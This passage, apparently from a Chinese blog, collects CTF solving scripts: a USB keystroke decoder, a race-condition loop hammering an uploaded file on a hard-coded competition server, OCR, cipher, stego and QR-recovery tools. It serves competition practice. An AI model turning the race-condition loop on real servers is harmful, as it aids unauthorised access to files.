class="string">"12"</span>: <span class="string">"O"</span>, <span class="string">"13"</span>: <span class="string">"P"</span>, <span class="string">"14"</span>: <span class="string">"Q"</span>, <span class="string">"15"</span>: <span class="string">"R"</span>,</span><br><span class="line">             <span class="string">"16"</span>: <span class="string">"S"</span>, <span class="string">"17"</span>: <span class="string">"T"</span>, <span class="string">"18"</span>: <span class="string">"U"</span>, <span class="string">"19"</span>: <span class="string">"V"</span>, <span class="string">"1a"</span>: <span class="string">"W"</span>, <span class="string">"1b"</span>: <span class="string">"X"</span>, <span class="string">"1c"</span>: <span class="string">"Y"</span>, <span class="string">"1d"</span>: <span class="string">"Z"</span>, <span class="string">"1e"</span>: <span class="string">"!"</span>,</span><br><span class="line">             <span class="string">"1f"</span>: <span class="string">"@"</span>, <span class="string">"20"</span>: <span class="string">"#"</span>, <span class="string">"21"</span>: <span class="string">"$"</span>, <span class="string">"22"</span>: <span class="string">"%"</span>, <span class="string">"23"</span>: <span class="string">"^"</span>, <span class="string">"24"</span>: <span class="string">"&amp;"</span>, <span class="string">"25"</span>: <span class="string">"*"</span>, <span class="string">"26"</span>: <span class="string">"("</span>, <span class="string">"27"</span>: <span class="string">")"</span>,</span><br><span class="line">             <span class="string">"28"</span>: <span class="string">"&lt;RET&gt;"</span>, <span class="string">"29"</span>: <span class="string">"&lt;ESC&gt;"</span>, <span class="string">"2a"</span>: <span class="string">"&lt;DEL&gt;"</span>, <span class="string">"2b"</span>: <span class="string">"\t"</span>, <span class="string">"2c"</span>: <span class="string">"&lt;SPACE&gt;"</span>, <span class="string">"2d"</span>: <span class="string">"_"</span>, <span class="string">"2e"</span>: <span class="string">"+"</span>, <span class="string">"2f"</span>: <span class="string">"&#123;"</span>,</span><br><span class="line">             <span class="string">"30"</span>: <span class="string">"&#125;"</span>, <span class="string">"31"</span>: <span class="string">"|"</span>, <span class="string">"32"</span>: <span class="string">"&lt;NON&gt;"</span>, <span class="string">"33"</span>: <span class="string">"\""</span>, <span class="string">"34"</span>: <span class="string">":"</span>, <span class="string">"35"</span>: <span class="string">"&lt;GA&gt;"</span>, <span class="string">"36"</span>: <span class="string">"&lt;"</span>, <span class="string">"37"</span>: <span class="string">"&gt;"</span>, <span class="string">"38"</span>: <span class="string">"?"</span>,</span><br><span class="line">             <span class="string">"39"</span>: <span class="string">"&lt;CAP&gt;"</span>, <span class="string">"3a"</span>: <span class="string">"&lt;F1&gt;"</span>, <span class="string">"3b"</span>: <span class="string">"&lt;F2&gt;"</span>, <span class="string">"3c"</span>: <span class="string">"&lt;F3&gt;"</span>, <span class="string">"3d"</span>: <span class="string">"&lt;F4&gt;"</span>, <span class="string">"3e"</span>: <span class="string">"&lt;F5&gt;"</span>, <span class="string">"3f"</span>: <span class="string">"&lt;F6&gt;"</span>,</span><br><span class="line">             <span class="string">"40"</span>: <span class="string">"&lt;F7&gt;"</span>, <span class="string">"41"</span>: <span class="string">"&lt;F8&gt;"</span>, <span class="string">"42"</span>: <span class="string">"&lt;F9&gt;"</span>, <span class="string">"43"</span>: <span class="string">"&lt;F10&gt;"</span>, <span class="string">"44"</span>: <span class="string">"&lt;F11&gt;"</span>, <span class="string">"45"</span>: <span class="string">"&lt;F12&gt;"</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># handle</span></span><br><span class="line">result = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> press <span class="keyword">in</span> keys:</span><br><span class="line">    Bytes = press.split(<span class="string">":"</span>)</span><br><span class="line">    <span class="keyword">if</span> Bytes[<span class="number">0</span>] == <span class="string">"00"</span>:</span><br><span class="line">        <span class="keyword">if</span> Bytes[<span class="number">2</span>] != <span class="string">"00"</span> <span class="keyword">and</span> Bytes[<span class="number">3</span>] == <span class="string">"00"</span>:</span><br><span class="line">            result += normalKeys[Bytes[<span class="number">2</span>]]</span><br><span class="line">    <span class="keyword">elif</span> Bytes[<span class="number">0</span>] == <span class="string">"20"</span>:  <span class="comment"># shift key is pressed.</span></span><br><span class="line">        <span class="keyword">if</span> Bytes[<span class="number">2</span>] != <span class="string">"00"</span> <span class="keyword">and</span> Bytes[<span class="number">3</span>] == <span class="string">"00"</span>:</span><br><span class="line">            result += shiftKeys[Bytes[<span class="number">2</span>]]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"[-] Unknow Key : %s"</span> % (Bytes[<span class="number">0</span>]))</span><br><span class="line">print(<span class="string">"[+] Found : %s"</span> % (result))</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="web条件竞争脚本"><a href="#web条件竞争脚本" class="headerlink" title="web条件竞争脚本"></a>web条件竞争脚本</h2><p>通过不断访问一个文件形成条件竞争,获得flag<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">'http://148.70.59.198:42534/uploads/9a155ffc4127de3a9e215a4d6f212d7f414ab49b/0bc87f6e573a0a69bc1a49c448be09b7775399c1'</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'Syc'</span> <span class="keyword">in</span>  r.text:</span><br><span class="line">        print(r.text)</span><br></pre></td></tr></table></figure></p>
<hr>
<h2 id="文字识别脚本"><a href="#文字识别脚本" class="headerlink" title="文字识别脚本"></a>文字识别脚本</h2><p>做题时收集的文字识别脚本,调用了百度ai<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> aip <span class="keyword">import</span> AipOcr</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="comment">#获取开始时间</span></span><br><span class="line">start = time.time()</span><br><span class="line"></span><br><span class="line"><span class="string">""" 你的 APPID AK SK """</span></span><br><span class="line">APP_ID = <span class="string">''</span></span><br><span class="line">API_KEY = <span class="string">''</span></span><br><span class="line">SECRET_KEY = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">client = AipOcr(APP_ID, API_KEY, SECRET_KEY)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">""" 读取图片 """</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_file_content</span><span class="params">(filePath)</span>:</span></span><br><span class="line">    print(filePath)</span><br><span class="line">    <span class="keyword">with</span> open(filePath, <span class="string">'rb'</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        <span class="keyword">return</span> fp.read()</span><br><span class="line">    </span><br><span class="line"><span class="string">""" 写入文本 """</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_on_txt</span><span class="params">(content,filePath,linefeed = <span class="string">"0"</span>)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    content：要写入的内容</span></span><br><span class="line"><span class="string">    filePath：要写入文件的路径</span></span><br><span class="line"><span class="string">    linefeed ：判断是否换行</span></span><br><span class="line"><span class="string">        - 1 为不换行 </span></span><br><span class="line"><span class="string">        - 其他 为换行</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="comment">#只需要将之前的”w"改为“a"即可，代表追加内容</span></span><br><span class="line">    <span class="keyword">with</span> open(filePath,<span class="string">"a"</span>) <span class="keyword">as</span> file:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            file.write(content)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">"写入错误"</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> linefeed != <span class="string">"1"</span>:</span><br><span class="line">                file.write(<span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#图片路径</span></span><br><span class="line">img_path = <span class="string">r"D:\\ubw (2019-11-2 9-55-43)"</span> <span class="comment"># 也可采用 r" D:\Test_path" 或者是"D:/Test_path"</span></span><br><span class="line"><span class="comment">#文本路径</span></span><br><span class="line">txt_path = <span class="string">r"D:\\ubw (2019-11-2 9-55-43)\\base.txt"</span></span><br><span class="line"></span><br><span class="line">options = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#遍历所有文件（使用 os.walk 方法）</span></span><br><span class="line"><span class="keyword">for</span> root,dirs,files <span class="keyword">in</span> os.walk(img_path):</span><br><span class="line">    <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">        <span class="comment"># 使用join函数将文件名称和文件所在根目录连接起来</span></span><br><span class="line">        file_dir = os.path.join(root, file)</span><br><span class="line">        print(file_dir)</span><br><span class="line">        <span class="comment"># write_on_txt("=============================",txt_path,"0")</span></span><br><span class="line">        write_on_txt(<span class="string">"文件名:"</span>+ file_dir,txt_path,<span class="string">"0"</span>)</span><br><span class="line">        <span class="comment">#判断是否是图片</span></span><br><span class="line">        <span class="keyword">if</span> file_dir[<span class="number">-4</span>:]==<span class="string">".png"</span><span class="keyword">or</span> file_dir[<span class="number">-4</span>:]==<span class="string">".jpg"</span>:</span><br><span class="line">            <span class="comment">#传入图片</span></span><br><span class="line">            image = get_file_content(file_dir)</span><br><span class="line">            <span class="string">""" 调用通用文字识别, 图片参数为本地图片 """</span></span><br><span class="line">            a = client.basicGeneral(image, options)</span><br><span class="line">            <span class="comment"># 查看返回的结果</span></span><br><span class="line">            <span class="comment"># print(a['words_result'])</span></span><br><span class="line">            print()</span><br><span class="line">            <span class="keyword">for</span> dic <span class="keyword">in</span> a[<span class="string">'words_result'</span>]:</span><br><span class="line">                print(dic[<span class="string">'words'</span>])</span><br><span class="line">                write_on_txt(dic[<span class="string">'words'</span>],txt_path,<span class="string">"0"</span>)</span><br><span class="line">                    </span><br><span class="line">end = time.time()</span><br><span class="line">print(<span class="string">'Running time: %1.2f Seconds'</span>%(end-start))</span><br></pre></td></tr></table></figure></p>
<hr>
<h2 id="解base64图片-PHP脚本"><a href="#解base64图片-PHP脚本" class="headerlink" title="解base64图片(PHP脚本)"></a>解base64图片(PHP脚本)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">imgBase64ToFile</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"> </span><br><span class="line">        $dir_path = realpath(<span class="string">"./"</span>) ;</span><br><span class="line">        <span class="keyword">if</span> (!is_dir($dir_path)) &#123;</span><br><span class="line">            mkdir($dir_path, <span class="number">0777</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $base64_image_content = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">if</span> (!$base64_image_content || !$dir_path) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $result = <span class="keyword">array</span>();</span><br><span class="line">        $new_file = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/^(data:\s*image\/(\w+);base64,)/'</span>, $base64_image_content, $result)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">empty</span>($result[<span class="number">2</span>])) &#123;</span><br><span class="line">                $type = $result[<span class="number">2</span>];</span><br><span class="line">                $new_file = $dir_path . time() . <span class="string">".&#123;$type&#125;"</span>;</span><br><span class="line">                file_put_contents($new_file, base64_decode(str_replace($result[<span class="number">1</span>], <span class="string">''</span>, $base64_image_content)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        print_r($new_file);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;img src=".'</span>.$new_file.<span class="string">'"/&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">imgBase64ToFile();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="四方解密脚本"><a href="#四方解密脚本" class="headerlink" title="四方解密脚本"></a>四方解密脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> collections</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">matrix = <span class="string">'ABCDEFGHIJKLMNOPRSTUVWXYZ'</span></span><br><span class="line">pla = <span class="string">'abcdefghijklmnoprstuvwxyz'</span></span><br><span class="line">key1 = <span class="string">'[HELLO]'</span></span><br><span class="line">key2 = <span class="string">'[WORLD]'</span></span><br><span class="line">key1 = <span class="string">''</span>.join(collections.OrderedDict.fromkeys(key1))</span><br><span class="line">key2 = <span class="string">''</span>.join(collections.OrderedDict.fromkeys(key2))</span><br><span class="line"></span><br><span class="line">matrix1 = re.sub(<span class="string">'[\[\]]'</span>,<span class="string">''</span>,key1) + re.sub(key1,<span class="string">''</span>,matrix)</span><br><span class="line">matrix2 = re.sub(<span class="string">'[\[\]]'</span>,<span class="string">''</span>,key2) + re.sub(key2,<span class="string">''</span>,matrix)</span><br><span class="line"></span><br><span class="line">matrix_list1 = []</span><br><span class="line">matrix_list2 = []</span><br><span class="line">pla_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(matrix1),<span class="number">5</span>):</span><br><span class="line">    matrix_list1.append(list(matrix1[i:i+<span class="number">5</span>]))</span><br><span class="line"><span class="comment">#print matrix_list1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(matrix2),<span class="number">5</span>):</span><br><span class="line">    matrix_list2.append(list(matrix2[i:i+<span class="number">5</span>]))</span><br><span class="line"><span class="comment">#print matrix_list2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(pla),<span class="number">5</span>):</span><br><span class="line">    pla_list.append(list(pla[i:i+<span class="number">5</span>]))</span><br><span class="line"><span class="comment">#print pla_list</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#查询两个密文字母位置</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_index1</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(matrix_list1)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(matrix_list1[i])):</span><br><span class="line">            <span class="keyword">if</span> matrix_list1[i][j] == x:</span><br><span class="line">                <span class="keyword">return</span> i,j</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_index2</span><span class="params">(y)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(len(matrix_list2)):</span><br><span class="line">        <span class="keyword">for</span> l <span class="keyword">in</span> range(len(matrix_list2[k])):</span><br><span class="line">            <span class="keyword">if</span> matrix_list2[k][l] == y:</span><br><span class="line">                <span class="keyword">return</span> k,l</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_pla</span><span class="params">(letter)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#两个子母中第一个字母位置</span></span><br><span class="line">    first = find_index1(letter[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment">#两个子母中第二个字母位置</span></span><br><span class="line">    second = find_index2(letter[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    pla = <span class="string">''</span></span><br><span class="line">    pla += pla_list[first[<span class="number">0</span>]][second[<span class="number">1</span>]]</span><br><span class="line">    pla += pla_list[second[<span class="number">0</span>]][first[<span class="number">1</span>]]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> pla</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    cip = <span class="string">'BLMIMTOWUNCBMD'</span></span><br><span class="line">    pla = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(cip),<span class="number">2</span>):</span><br><span class="line">        pla += gen_pla(cip[i:i+<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">print</span> pla</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="连续解压压缩包脚本"><a href="#连续解压压缩包脚本" class="headerlink" title="连续解压压缩包脚本"></a>连续解压压缩包脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>, <span class="number">0</span>, <span class="number">-1</span>):</span><br><span class="line">  tf = tarfile.open(str(i)+<span class="string">".tar"</span>)</span><br><span class="line">  tf.extractall()</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="将javascript处理后的编码还原成QR图片脚本"><a href="#将javascript处理后的编码还原成QR图片脚本" class="headerlink" title="将javascript处理后的编码还原成QR图片脚本"></a>将javascript处理后的编码还原成QR图片脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">from</span> pyzbar.pyzbar <span class="keyword">import</span> decode</span><br><span class="line">b = list(map(int, <span class="string">''</span>.split(<span class="string">' '</span>)))</span><br><span class="line">png_header = <span class="string">'89504e470d0a1a0a0000000d49484452'</span></span><br><span class="line">png_header = [png_header[i*<span class="number">2</span>:(i+<span class="number">1</span>)*<span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> range(len(png_header) // <span class="number">2</span>)]</span><br><span class="line">png_header = list(map(<span class="keyword">lambda</span> x: int(x, <span class="number">16</span>), png_header))</span><br><span class="line">LEN = <span class="number">16</span></span><br><span class="line">key = [<span class="literal">None</span> <span class="keyword">for</span> _ <span class="keyword">in</span> range(LEN)]</span><br><span class="line">shifters = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(LEN):</span><br><span class="line">    shifters_i = []</span><br><span class="line">    <span class="keyword">for</span> shifter <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        <span class="keyword">if</span> b[(shifter * LEN) % len(b) + i] == png_header[i]:</span><br><span class="line">            shifters_i.append(shifter)</span><br><span class="line">    shifters.append(shifters_i)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">assemble_png</span><span class="params">(k)</span>:</span></span><br><span class="line">    result = [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">30000</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(LEN):</span><br><span class="line">        shifter = ord(k[i]) - ord(<span class="string">'0'</span>)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(b) // LEN):</span><br><span class="line">            result[(j * LEN) + i] = b[(((j + shifter) * LEN) % len(b)) + i]</span><br><span class="line">    i = len(result) - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> result[i] == <span class="number">0</span>:</span><br><span class="line">        i -= <span class="number">1</span></span><br><span class="line">    result = result[:i + <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">valid_keys = []</span><br><span class="line">print(<span class="string">'&#123;:&lt;5&#125;&#123;:&lt;20&#125;&#123;&#125;'</span>.format(<span class="string">'#'</span>, <span class="string">'Candidate'</span>, <span class="string">'isValid?'</span>))</span><br><span class="line"><span class="keyword">for</span> i, key_candidate <span class="keyword">in</span> enumerate(itertools.product(*shifters)):</span><br><span class="line">    key_candidate = <span class="string">''</span>.join(map(str, key_candidate))</span><br><span class="line">    png_candidate = assemble_png(key_candidate)</span><br><span class="line">    f = io.BytesIO(bytes(png_candidate))</span><br><span class="line">    valid = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pilimage = Image.open(f)</span><br><span class="line">        valid = <span class="literal">True</span></span><br><span class="line">        valid_keys.append(key_candidate)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    print(<span class="string">'&#123;:&lt;5&#125;&#123;:&lt;20&#125;&#123;&#125;'</span>.format(i, key_candidate, valid))</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> valid_keys:</span><br><span class="line">    f = io.BytesIO(bytes(assemble_png(key)))</span><br><span class="line">    pilimage = Image.open(f)</span><br><span class="line">    decoded = decode(pilimage)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'picoCTF'</span> <span class="keyword">in</span> str(decoded.data):</span><br><span class="line">        print(str(decoded.data, <span class="string">'utf-8'</span>))</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="base64隐写解密脚本"><a href="#base64隐写解密脚本" class="headerlink" title="base64隐写解密脚本"></a>base64隐写解密脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_base64_diff_value</span><span class="params">(s1, s2)</span>:</span></span><br><span class="line">    base64chars = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(s2)):</span><br><span class="line">        <span class="keyword">if</span> s1[i] != s2[i]:</span><br><span class="line">            <span class="keyword">return</span> abs(base64chars.index(s1[i]) - base64chars.index(s2[i]))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve_stego</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'3.txt'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        file_lines = f.readlines()</span><br><span class="line">        bin_str = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> file_lines:</span><br><span class="line">            steg_line = line.replace(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line">            norm_line = line.replace(<span class="string">'\n'</span>, <span class="string">''</span>).decode(<span class="string">'base64'</span>).encode(<span class="string">'base64'</span>).replace(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line">            diff = get_base64_diff_value(steg_line, norm_line)</span><br><span class="line">            <span class="keyword">print</span> diff</span><br><span class="line">            pads_num = steg_line.count(<span class="string">'='</span>)</span><br><span class="line">            <span class="keyword">if</span> diff:</span><br><span class="line">                bin_str += bin(diff)[<span class="number">2</span>:].zfill(pads_num * <span class="number">2</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                bin_str += <span class="string">'0'</span> * pads_num * <span class="number">2</span></span><br><span class="line">            <span class="keyword">print</span> goflag(bin_str)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">goflag</span><span class="params">(bin_str)</span>:</span></span><br><span class="line">    res_str = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, len(bin_str), <span class="number">8</span>):</span><br><span class="line">        res_str += chr(int(bin_str[i:i + <span class="number">8</span>], <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> res_str</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    solve_stego()</span><br></pre></td></tr></table></figure>
<hr>
